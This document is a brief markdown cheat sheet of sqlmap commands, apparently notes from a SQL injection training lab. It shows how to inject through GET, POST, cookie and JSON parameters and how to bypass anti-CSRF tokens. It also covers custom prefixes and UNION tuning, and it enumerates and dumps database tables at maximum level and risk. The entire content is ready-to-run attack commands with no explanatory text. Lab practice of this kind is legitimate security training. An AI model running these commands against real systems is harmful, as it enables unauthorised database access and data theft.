___
# GET

```bash
sqlmap -u "http://83.136.254.47:49729/case1.php?id=1" --cookie="cookie=XSSisF  
un" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

- --dbs
- --tables -D testdb
- --dump -T flag1 -D testdb
# POST

```bash
sqlmap -u "http://83.136.254.47:49729/case2.php" --data='id=1' --method POST --cookie="cookie=XSSisFun" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

# Cookie

```bash
sqlmap -u "http://83.136.254.47:49729/case3.php" --cookie="cookie=XSSisFun; id=1" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

# JSON

```bash
sqlmap -u "http://83.136.254.47:49729/case4.php" --data='{"id":1}' --method POST --cookie="cookie=XSSisFun" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

# OR SQLi

```bash
sqlmap -u "http://83.136.254.47:49729/case5.php?id=1" --cookie="cookie=XSSisF  
un" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

# Non-standard boundaries

```bash
sqlmap -u "http://83.136.254.47:49729/case6.php?col=id" --cookie="cookie=XSSisFun" --level 5 --risk 3 -p col --batch --threads 10 --dbms=mysql --dbs --prefix='`)'
```

# UNION SQLi with adjustments

```bash
sqlmap http://94.237.52.98:38740/case7.php?id=1 --union-cols=5 --level 5 --risk 3 -p id --batch --dbs
```

# anti-CSRF token bypass

```bash
sqlmap -u "http://83.136.254.47:46258/case8.php?id=1" --data="id=1&t0ken=N2zrnsP1IZI7DxBalvg1xgQ4q1cTf6Y4dumE1ts" --method POST --csrf-token="t0ken" --level 5 --risk 3 -p id --batch --dbms=mysql --dbs
```

